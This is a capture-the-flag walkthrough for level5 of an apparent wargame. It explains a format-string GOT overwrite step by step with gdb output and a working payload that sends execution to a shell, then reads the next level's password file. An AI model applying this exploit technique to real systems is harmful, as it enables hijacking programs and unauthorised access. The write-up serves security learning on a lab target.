# Way to level6

When we enter `level5`, we can see one executable file as same as previous level.
It also takes input via heredoc, let's deep dive with `gdb`

```gdb
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave  
   0x08048510 <+12>:    ret    
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
---Type <return> to continue, or q <return> to quit---
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb) disassemble o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
(gdb) disassemble n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
```

## 1. Why GOT overwrite (the diff from level3/level4)

`n` reads our input with `fgets` (`0x080484e5`) and feeds it straight into
`printf(buf)` (`0x080484f3`) — the usual format-string bug. But notice two things:

- There is **no `cmp`** anywhere in `n` (compare the disassembly to level3/level4,
  where a `cmp` gated the win). So there is no global variable to match.
- `o()` (`0x080484a4`), the function that does `system("/bin/sh")`, is **never
  called** by anything.

So this time we cannot "pass a branch." Instead we hijack control flow with a
**GOT (Global Offset Table) overwrite**: right after `printf` returns, `n` calls
`exit@plt` (`0x080484ff`). If we overwrite the GOT entry that `exit` jumps through so
it points at `o()`, that `exit` call lands in `o()` and spawns the shell.

What is the GOT? When a program calls a libc function (`system`, `printf`, …) its
real address is not known at compile time; the loader fills it into the GOT at
runtime, and — crucially — the **GOT is writable memory**, so a format-string write
can patch it.

Find the GOT slot used by `exit`:
```gdb
(gdb) disassemble exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```
The first instruction `jmp *0x8049838` means **`GOT[exit] = 0x8049838`** (source:
`exit@plt+0`). That is the 4-byte slot we must overwrite with the address of `o()`.

And the target value is `o`'s address, `0x080484a4` (source: `info functions` →
`o`). The shell it ultimately runs:
```gdb
(gdb) x/s 0x80485f0
0x80485f0:       "/bin/sh"
```
(source: `o+6` pushes `$0x80485f0` as `system`'s argument).

## 2. Finding the offset (deriving "4")

We place `AAAA` (= `0x41414141`) as a marker and dump the stack slots `printf`
consumes:
```bash
level5@RainFall:~$ ./level5
AAAA%x %x %x %x
AAAAb7ff26b0 bffff704 b7fd0ff4 41414141
```
Numbering each `%x`:

| # | value |
|---|-----------|
| 1 | b7ff26b0  |
| 2 | bffff704  |
| 3 | b7fd0ff4  |
| 4 | **41414141** |

`41414141` first shows up at the **4th** `%x`, so **offset = 4**: the first 4 bytes
of our buffer are argument slot 4. (This matches level3, where `printf` is likewise
called inside the same function as `fgets`; level4's offset was 12 only because its
`printf` lived in a separate callee `p()`.)

## 3. Why two addresses, not one — the chain from "2-byte unit"

In level3/level4 we wrote the whole value in **one shot**, so only **one** 4-byte
address sat at the front of the payload. level5 is different, and this is the key
correction: we end up with a **total of two** addresses (8 bytes), not "one address
plus two extra." Here is why, step by step — every link is pulled by the single
decision to write **2 bytes at a time**:

1. Writing `o`'s address `0x080484a4` in one `%n` would require printing
   `0x080484a4 = 134,513,828` characters (source: decimal of `0x080484a4`).
   134 million characters is impractical.
2. So we split the value into **2-byte halves**: low half `0x84a4` and high half
   `0x0804` (source: the two 16-bit halves of `0x080484a4`).
3. We write each half with **`%hn`** (the `h` length modifier makes `%n` store a
   **2-byte** short) → that is **two writes**.
4. Two writes need **two destination addresses** at the front of the payload →
   hence **two** addresses, 8 bytes total.

So "2-byte unit" → 2 fragments → 2 `%hn` writes → 2 start addresses. One decision
drives all three counts.

## 4. Where `0x804983a` comes from, and little-endian placement

`GOT[exit]` occupies 4 bytes starting at `0x8049838`. Drawn as memory cells:

```
address : 0x8049838  0x8049839  0x804983a  0x804983b
bytes   : [  a4  ]   [  84  ]   [  04  ]   [  08  ]      <- 0x080484a4 little-endian
          \__ low half 0x84a4 __/ \__ high half 0x0804 _/
            written at 0x8049838      written at 0x804983a
```

Because x86 is **little-endian**, the value `0x080484a4` lies in memory as the byte
sequence `a4 84 04 08`. Therefore:

- the **low** half `0x84a4` goes to the **low** address `0x8049838` (the GOT slot
  itself), and
- the **high** half `0x0804` goes to `0x8049838 + 2 = 0x804983a`.

The `+2` is exactly the **2-byte** step from part 3 — that is the entire source of
`0x804983a` (source: `GOT[exit] = 0x8049838` from `exit@plt`, plus the 2-byte
offset).

## 5. Character-count arithmetic (the magic numbers)

`%hn` writes the **cumulative** number of characters printed so far, and that counter
only ever **increases**. So we must emit the **smaller** target value first.

The two halves as decimals:
- `0x0804 = 2052` (the high half → written to `0x804983a`)
- `0x84a4 = 33956` (the low half → written to `0x8049838`)

Since `2052 < 33956`, we lay the addresses so the `2052` write happens first. Payload
order of the two front addresses is `[0x804983a][0x8049838]`, which means:

- **slot 4 = `0x804983a`**, to receive `2052`
- **slot 5 = `0x8049838`**, to receive `33956`

Now the padding:

- The two addresses themselves already print **8 characters** (8 bytes).
- Padding A = `2052 − 8 = 2044` → `%2044x`, then `%4$hn` writes the running count
  `8 + 2044 = 2052` into slot 4 (`0x804983a`). ✓  (source: `2052` is `0x0804`, `8`
  is the two 4-byte addresses)
- Padding B = `33956 − 2052 = 31904` → `%31904x`, then `%5$hn` writes the new running
  count `2052 + 31904 = 33956` into slot 5 (`0x8049838`). ✓  (source: `33956` is
  `0x84a4`, `2052` is the count already emitted)

## 6. Why direct parameter access `%4$hn` / `%5$hn`

We use `$`-indexed directives rather than a chain of plain `%x` to walk the stack.
The padding fields `%2044x` and `%31904x` consume one argument slot each as they go,
but with `%4$hn`/`%5$hn` we point at slots 4 and 5 **explicitly**, so we never have to
count how many slots the padding consumed. Direct access keeps the slot bookkeeping
trivial and makes the write land exactly where we computed.

## 7. Payload and the shell-stdin trick

```bash
python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' > /tmp/exp
cat /tmp/exp - | ./level5
whoami
level6
cat /home/user/level6/.pass
```

Breaking the payload down:
- `\x3a\x98\x04\x08` = `0x804983a` (slot 4) — destination of the `2052` write.
- `\x38\x98\x04\x08` = `0x8049838` (slot 5) — destination of the `33956` write.
- `%2044x%4$hn` — pad to 2052, write high half `0x0804` to `0x804983a`.
- `%31904x%5$hn` — pad to 33956, write low half `0x84a4` to `0x8049838`.

After both writes, `GOT[exit]` holds `0x080484a4`, so the `exit@plt` call at
`n+61` jumps into `o()`, which runs `system("/bin/sh")`.

**The hyphen (`-`) trick:** `o()` runs `system("/bin/sh")`, an **interactive** shell
that reads from stdin. If we piped only the payload, stdin would hit EOF the instant
the payload is consumed and the shell would die immediately. `cat /tmp/exp - | ./level5`
fixes this: after `cat` dumps the exploit file, the `-` makes `cat` keep streaming our
**terminal's** stdin into the program, so the spawned `/bin/sh` stays alive to accept
`whoami`, `cat .../.pass`, etc.

This is the contrast with **level4**, where `system` ran `"/bin/cat /home/user/level5/.pass"`
directly — a one-shot command with no interactive prompt, so `| ./level4` alone
sufficed and no `cat -` trick was needed.

## 8. Summary — why only level5 is this involved

| | level3 / level4 | level5 |
|---|---|---|
| Win condition | pass a `cmp` branch (set a global) | no `cmp` → **GOT overwrite** to hijack flow into the never-called `o()` |
| Write shape | value written **in one shot** → **1** address | value too large → **2-byte split** + `%hn` → **2** addresses |
| Shell | level4: `system` runs `cat` directly → no trick | `system("/bin/sh")` → interactive → needs `cat /tmp/exp - \| ./level5` |

## ASLR note

This exploit is independent of stack ASLR. Both write targets are **fixed GOT
addresses** (`0x8049838` and `0x804983a`, derived from `exit@plt`), the value written
is the **fixed address of `o()`** (`0x080484a4`), and we reach the format arguments
with **direct parameter access** (`%4$hn` / `%5$hn`) rather than any leaked stack
pointer. Since nothing in the payload depends on a randomized stack address, the
exploit is identical and reliable run to run.
